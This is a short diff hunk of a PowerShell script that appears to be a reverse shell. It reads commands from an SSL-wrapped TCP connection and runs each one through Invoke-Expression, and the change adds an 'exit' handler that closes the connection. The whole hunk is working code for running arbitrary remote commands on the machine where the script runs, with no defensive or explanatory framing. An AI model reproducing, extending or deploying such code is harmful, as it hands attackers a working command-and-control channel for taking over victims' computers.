@@ -45,7 +45,12 @@ while ($true) {
         while (($bytesRead = $sslStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
         
             $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)
-        
+            if ($command -eq "exit" -or $command -eq "EXIT") {
+                $streamWriter.Close()
+                $sslStream.Close()
+                $TCPConnection.Close()
+                continue
+            }
             $command_output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             }
